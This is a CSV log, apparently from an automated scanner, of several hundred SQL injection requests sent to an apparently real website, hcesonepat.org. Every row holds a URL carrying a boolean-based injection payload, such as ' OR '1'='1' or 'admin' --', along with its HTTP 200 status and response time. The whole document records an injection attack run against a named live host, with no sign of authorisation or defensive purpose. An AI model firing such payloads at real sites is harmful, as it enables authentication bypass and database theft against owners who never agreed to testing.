URL,Status Code,Response Time (s),Payload
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4094657897949219,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.5412344932556152,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.6158876419067383,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.0994572639465332,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.653409719467163,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.096144199371338,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.64369535446167,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.6111419200897217,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.0914249420166016,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.643934965133667,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.5693683624267578,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1927192211151123,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.7175953388214111,' OR 1=1#
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.6394541263580322,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.5831007957458496,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1864800453186035,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.6403121948242188,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.5955617427825928,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.1862397193908691,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.7024576663970947,admin' #
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.6915643215179443,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.1719655990600586,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.615823745727539,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.5609135627746582,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.4175984859466553,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.6181349754333496,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1095707416534424,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.5591909885406494,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.1119053363800049,' OR 1=1--
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.629737138748169,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.6305418014526367,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.6802644729614258,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.6778278350830078,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.629652976989746,admin' #
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.2840068340301514,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.2586307525634766,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.5339672565460205,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.6206979751586914,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.473062515258789,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.282299518585205,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.2863876819610596,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.5100338459014893,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.2871901988983154,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.4604818820953369,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.4573044776916504,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.2319247722625732,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.2027618885040283,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.427635669708252,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.3729195594787598,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.2115473747253418,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.36745548248291016,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.376579761505127,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.32602953910827637,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.3242952823638916,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.3246934413909912,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.3398842811584473,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1533207893371582,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.26716184616088867,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.2731640338897705,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.2654128074645996,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4167966842651367,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.511432409286499,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.5024607181549072,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.2632322311401367,' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.4513905048370361,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.4677584171295166,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.4894087314605713,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.256685733795166,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.198885440826416,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.49020934104919434,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.2858457565307617,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.5241899490356445,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.5259048938751221,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.31476569175720215,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.3289511203765869,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.33561062812805176,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.44762420654296875,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.3210442066192627,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.32421231269836426,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.35166454315185547,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.32387590408325195,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.33365464210510254,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.1091978549957275,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.4456603527069092,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1107957363128662,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.0936338901519775,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.4772231578826904,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.1112043857574463,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.3845736980438232,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.1286816596984863,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.392765760421753,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.3375201225280762,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.48835301399230957,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.3582677841186523,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.2683038711547852,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.6201519966125488,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.3802101612091064,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.2534325122833252,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.2165989875793457,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.344604253768921,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.573359489440918,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.4835350513458252,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.5133256912231445,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.5137505531311035,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.5601434707641602,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.5571086406707764,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.5607678890228271,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.5667104721069336,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.4267964363098145,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.5753130912780762,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.5753498077392578,1 OR 1=1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.5622239112854004,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.5595266819000244,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.5446262359619141,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.3177177906036377,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.4488987922668457,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.3340599536895752,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.5469152927398682,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.5449621677398682,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.5451123714447021,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.5480377674102783,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.5325236320495605,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.2406797409057617,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.291341781616211,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.23128342628479,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.5234911441802979,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.5174636840820312,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.3948967456817627,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.288041353225708,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.49291181564331055,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.46691298484802246,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4665040969848633,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.47432589530944824,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.4853403568267822,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.3020248413085938,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.5062265396118164,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.5175867080688477,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.194347620010376,1 OR 1=1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.1568143367767334,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.3256504535675049,admin' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.2870609760284424,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2842733860015869,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.2873713970184326,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.3090672492980957,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.27542877197265625,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.2788388729095459,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.271146297454834,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.321617841720581,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.0876712799072266,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.280484914779663,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.0718557834625244,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.002303123474121,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.2718777656555176,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.0495805740356445,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.22793102264404297,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.22796845436096191,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.20633769035339355,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.21744990348815918,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.23859000205993652,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.21309781074523926,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.22838568687438965,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2294020652770996,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.016172170639038,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.23937106132507324,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.23954343795776367,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.3967611789703369,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.34763193130493164,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.26946020126342773,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.27004528045654297,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.27300286293029785,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.28438901901245117,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.285064697265625,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.29079604148864746,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.2089366912841797,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.1258199214935303,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.35828471183776855,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.3586258888244629,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.35912299156188965,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.3964557647705078,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.4163026809692383,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.4183163642883301,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.4207329750061035,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.4210853576660156,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4336578845977783,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.6267476081848145,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.4262580871582031,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4263336658477783,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4951763153076172,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.292424201965332,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.4123716354370117,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.3014707565307617,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.1831037998199463,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.444014549255371,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.2831816673278809,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.1775717735290527,' OR 1=1 --
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.2576642036437988,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.40607309341430664,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.3477027416229248,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.4461216926574707,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.3186874389648438,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1545476913452148,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.5930228233337402,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.58355712890625,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.3704617023468018,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.2677559852600098,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.094691514968872,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.3708901405334473,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.3043785095214844,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1082348823547363,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.3338570594787598,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1005511283874512,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.332988977432251,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.2328104972839355,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1150870323181152,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.3299317359924316,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.2350656986236572,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.0486781597137451,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.481438159942627,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.2801990509033203,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.1829323768615723,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.5353186130523682,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.33913373947143555,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.34674787521362305,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.6255548000335693,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.4938828945159912,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.1581804752349854,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.4373977184295654,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.2310593128204346,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1420822143554688,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.477738618850708,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.5262031555175781,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.20670747756958,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.131030559539795,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.522280216217041,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.131291389465332,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.3809285163879395,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.214456558227539,admin' --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.4569430351257324,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.0981295108795166,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.3843798637390137,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.1954028606414795,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.0896108150482178,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.3809051513671875,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.26758360862731934,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.27126502990722656,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.2139887809753418,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.069864273071289,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.3658287525177002,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.0665931701660156,' OR 1=1 --
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.2745211124420166,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.1955199241638184,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.2554798126220703,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.0765471458435059,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.0677013397216797,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.326629638671875,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.2833614349365234,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.103954792022705,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.0326008796691895,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.3365974426269531,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.326150894165039,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.027984380722046,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.2464606761932373,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.292381763458252,admin' #
